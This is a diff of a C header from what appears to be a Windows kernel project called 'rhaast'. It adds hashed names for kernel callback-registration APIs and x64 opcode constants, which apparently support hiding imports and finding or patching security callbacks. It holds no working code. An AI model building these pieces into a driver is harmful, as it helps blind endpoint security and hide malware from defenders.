@@ -26,6 +26,7 @@
 #define SYSTEM_PROCESS_PID  0x4
 
 /* rhaast memory pool tags */
+#define RS_POOL_TAG_RHST	'tshR'
 #define RS_POOL_TAG_PSHD	'DHsP'
 
 #define H_KEY 5381
@@ -34,11 +35,17 @@
 #define H_MODULE_NTOSKRNL   0x9bf03a73
 
 /* function hashes */
-#define H_API_PSISPROTECTEDPROCESSLIGHT         0xe34e5025
-#define H_API_PSSETCREATEPROCESSNOTIFYROUTINE   0x7923f7e6
+#define H_API_PSISPROTECTEDPROCESSLIGHT             0xe34e5025
+#define H_API_ZWQUERYSYSTEMINFORMATION              0x8754a7f7
+#define H_API_PSSETCREATEPROCESSNOTIFYROUTINE       0x7923f7e6
+#define H_API_PSSETCREATETHREADNOTIFYROUTINE        0xbedbd03f
+#define H_API_PSSETLOADIMAGENOTIFYROUTINE           0xd919f4f6
+#define H_API_SEREGISTERIMAGEVERIFICATIONCALLBACK   0xd8007615
 
 /* x64 assembly instruction */
-#define ASM_RET  0xC3
-#define ASM_JMP  0xE9
-#define ASM_CALL 0xE8
-#define ASM_LEA  0x8D4C
+#define ASM_RET      0xC3
+#define ASM_JMP      0xE9
+#define ASM_CALL     0xE8
+#define ASM_LEA_R13  0x8D4C
+#define ASM_LEA_RCX  0x8D48
+#define ASM_MOV_RCX  0x8B48
